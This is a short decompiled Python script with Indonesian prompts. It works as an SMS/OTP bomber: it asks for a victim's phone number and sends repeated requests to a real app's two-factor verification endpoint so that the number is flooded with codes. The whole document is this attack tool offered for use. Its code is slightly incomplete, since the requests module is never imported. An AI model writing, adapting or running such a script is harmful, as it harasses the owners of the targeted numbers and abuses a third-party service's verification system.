# FileName : 
# Python Bytecode : 3.8
# Time Succses Decompiled : Thu Aug 27 22:45:33 2020
# Timestamp In Code: 2020-06-25 21:39:46

print('format nomor target : 6281473827462')
print('ingat depannya harus 62')
print('cuman bisa 30 menit 1x dengan target sama')
print('_____________________________________')
banyak = 10
n = input('masukkan nomor target: ')
print('otw kirim ke ' + n)
headers = {'User-Agent':'Mozilla/5.0',  'Authorization':'Token '}
for i in range(banyak):
    response = requests.post('https://id-api.spooncast.net/tfa/send/', json={'msisdn': '' + n + ''})
    print(response.json())